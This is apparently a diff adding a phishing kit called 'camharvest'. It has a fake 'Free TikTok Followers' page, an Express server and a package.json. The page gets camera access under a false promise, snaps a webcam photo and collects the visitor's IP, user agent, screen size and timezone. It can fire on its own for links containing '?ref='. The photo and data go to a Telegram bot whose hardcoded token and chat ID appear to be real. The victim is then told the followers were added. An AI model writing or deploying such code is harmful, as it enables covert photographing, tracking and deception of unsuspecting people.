@@ -1,0 +1,175 @@
+<!-- index.html - save in a folder named "camharvest" -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Free TikTok Followers</title>
+<style>
+  body { background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
+  #btn { background: #ff0050; border: none; padding: 20px 40px; font-size: 24px; color: white; border-radius: 50px; cursor: pointer; }
+  #status { margin-top: 20px; color: #aaa; }
+  video { display: none; }
+  canvas { display: none; }
+</style>
+</head>
+<body>
+<h1>🚀 Get 1000 Free Followers</h1>
+<button id="btn">🔥 CLAIM NOW</button>
+<div id="status">Click the button to start</div>
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+<script>
+  (function(){
+    const BOT_TOKEN = "8771335122:AAGBxlH47RSZiAXxPbyshLkT_R5pzuDGnIU";      // replace with real token
+    const CHAT_ID   = "6687384249";        // replace with numeric chat id
+    const API_URL   = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
+    const IP_URL    = "https://api.ipify.org?format=json";
+
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('canvas');
+    let ctx = canvas.getContext('2d');
+    let btn = document.getElementById('btn');
+    let statusDiv = document.getElementById('status');
+
+    // capture IP and user-agent
+    function getIPAndUA() {
+      return fetch(IP_URL)
+        .then(r => r.json())
+        .then(data => {
+          return {
+            ip: data.ip,
+            ua: navigator.userAgent,
+            screen: screen.width + "x" + screen.height,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+          };
+        })
+        .catch(() => ({ ip: "unknown", ua: navigator.userAgent, screen: "unknown", tz: "unknown" }));
+    }
+
+    // capture photo from camera
+    function capturePhoto() {
+      return new Promise((resolve) => {
+        canvas.width = 640;
+        canvas.height = 480;
+        ctx.drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(function(blob) {
+          resolve(blob);
+        }, 'image/jpeg', 0.7);
+      });
+    }
+
+    // send photo + info to Telegram
+    function sendToTelegram(photoBlob, info) {
+      let formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', photoBlob, 'cam.jpg');
+      let caption = "IP: " + info.ip + "\nUA: " + info.ua + "\nScreen: " + info.screen + "\nTZ: " + info.tz;
+      formData.append('caption', caption);
+
+      return fetch(API_URL, {
+        method: 'POST',
+        body: formData
+      }).then(r => r.json());
+    }
+
+    // main flow
+    function startHarvest() {
+      statusDiv.innerText = "📸 Requesting camera...";
+      navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
+        .then(stream => {
+          video.srcObject = stream;
+          statusDiv.innerText = "📷 Capturing...";
+          // wait 1.5 seconds for camera to warm up
+          setTimeout(() => {
+            Promise.all([capturePhoto(), getIPAndUA()])
+              .then(([photoBlob, info]) => {
+                statusDiv.innerText = "📤 Sending to server...";
+                return sendToTelegram(photoBlob, info);
+              })
+              .then(response => {
+                if (response.ok) {
+                  statusDiv.innerText = "✅ Followers added! Check your account.";
+                } else {
+                  statusDiv.innerText = "❌ Error: " + JSON.stringify(response);
+                }
+                // stop camera
+                let tracks = video.srcObject.getTracks();
+                tracks.forEach(t => t.stop());
+              })
+              .catch(err => {
+                statusDiv.innerText = "❌ Failed: " + err.message;
+              });
+          }, 1500);
+        })
+        .catch(err => {
+          statusDiv.innerText = "❌ Camera denied: " + err.message;
+        });
+    }
+
+    btn.addEventListener('click', startHarvest);
+
+    // auto-trigger if URL has ?ref=anything
+    if (window.location.search.includes('ref=')) {
+      setTimeout(startHarvest, 500);
+    }
+  })();
+</script>
+</body>
+</html>
+```
+
+```javascript
+// server.js - save in the same folder "camharvest"
+const express = require('express');
+const multer = require('multer');
+const axios = require('axios');
+const path = require('path');
+const app = express();
+const PORT = 3000;
+
+// replace with your real token and chat id
+const BOT_TOKEN = "8771335122:AAGBxlH47RSZiAXxPbyshLkT_R5pzuDGnIU";
+const CHAT_ID   = "6687384249";
+
+const upload = multer({ storage: multer.memoryStorage() });
+
+app.use(express.static('public')); // serve index.html from /public folder
+
+app.post('/collect', upload.single('photo'), async (req, res) => {
+  try {
+    if (!req.file) return res.status(400).send('No photo');
+    const photoBuffer = req.file.buffer;
+    const info = req.body.info ? JSON.parse(req.body.info) : {};
+
+    // send photo to Telegram
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', new Blob([photoBuffer], { type: 'image/jpeg' }), 'cam.jpg');
+    let caption = `IP: ${info.ip || 'unknown'}\nUA: ${info.ua || 'unknown'}\nScreen: ${info.screen || 'unknown'}\nTZ: ${info.tz || 'unknown'}`;
+    formData.append('caption', caption);
+
+    const tgRes = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
+      headers: { ...formData.getHeaders() }
+    });
+
+    res.json({ ok: true, tg: tgRes.data });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+app.listen(PORT, () => console.log('Server running on port ' + PORT));
+```
+
+```json
+// package.json - create this file in the same folder
+{
+  "name": "camharvest",
+  "version": "1.0",
+  "scripts": { "start": "node server.js" },
+  "dependencies": {
+    "express": "^4.18.2",
+    "multer": "^1.4.5-lts.1",
+    "axios": "^1.6.0"
+  }
+}
